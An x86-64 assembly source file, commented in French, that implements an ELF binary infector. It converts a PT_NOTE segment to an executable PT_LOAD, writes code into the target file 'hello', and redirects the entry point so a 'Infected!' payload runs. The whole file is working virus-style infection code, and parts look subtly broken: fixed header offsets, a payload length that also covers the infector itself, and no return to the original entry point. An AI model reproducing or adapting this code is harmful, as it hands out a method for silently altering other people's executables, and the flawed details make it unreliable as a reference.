section .text
    global _start

shellcode:
    ; Affiche "Infected!"
    mov rax, 1              ; syscall: write
    mov rdi, 1              ; stdout
    lea rsi, [rel msg]      ; Adresse du message
    mov rdx, 9              ; Longueur du message
    syscall

_start:

    ; Ouverture du fichier ELF en écriture
    mov rax, 2              ; syscall: open
    lea rdi, [rel filename] ; Nom du fichier
    mov rsi, 2              ; O_RDWR (lecture-écriture)
    xor rdx, rdx            ; Pas de flags supplémentaires
    syscall
    test rax, rax
    js exit_error
    mov r8, rax             ; Sauvegarde du file descriptor

    ; Modifier le type du segment PT_NOTE (0x04 -> 0x01)
    mov rax, 8              ; syscall: lseek
    mov rdi, r8
    mov rsi, 0x120          ; Offset de l'en-tête du segment
    xor rdx, rdx
    syscall

    mov rax, 1              ; syscall: write
    mov rdi, r8
    lea rsi, [rel new_type] ; Nouveau type PT_LOAD
    mov rdx, 4              ; Taille (4 octets)
    syscall

    ; Modifier les permissions du segment (0x04 -> 0x05)
    mov rax, 8              ; syscall: lseek
    mov rdi, r8
    mov rsi, 0x138          ; Offset des permissions
    xor rdx, rdx
    syscall

    mov rax, 1              ; syscall: write
    mov rdi, r8
    lea rsi, [rel new_flags] ; Permissions R E
    mov rdx, 4
    syscall

    ; Injecter le shellcode à l'offset 0x368
    mov rax, 8              ; syscall: lseek
    mov rdi, r8
    mov rsi, 872            ; 0x368 en décimal
    xor rdx, rdx
    syscall

    mov rax, 1              ; syscall: write
    mov rdi, r8
    lea rsi, [rel shellcode]
    mov rdx, shellcode_len
    syscall

    ; Modifier l'entry point pour pointer vers 0x368
    mov rax, 8              ; syscall: lseek
    mov rdi, r8
    mov rsi, 24             ; Offset de l'entry point (0x18 en décimal)
    xor rdx, rdx
    syscall

    mov rax, 1              ; syscall: write
    mov rdi, r8
    lea rsi, [rel new_entry]
    mov rdx, 8              ; Taille (8 octets)
    syscall

    ; Fermer le fichier et terminer
    mov rax, 3              ; syscall: close
    mov rdi, r8
    syscall

    mov rax, 60             ; syscall: exit
    xor rdi, rdi
    syscall

exit_error:
    mov rax, 60
    mov rdi, 1              ; Code d'erreur
    syscall

msg db "Infected!", 0
filename db "hello", 0
new_type db 0x01, 0x00, 0x00, 0x00
new_flags db 0x05, 0x00, 0x00, 0x00
new_entry dq 0x368           ; Nouvelle adresse virtuelle
shellcode_len equ $ - shellcode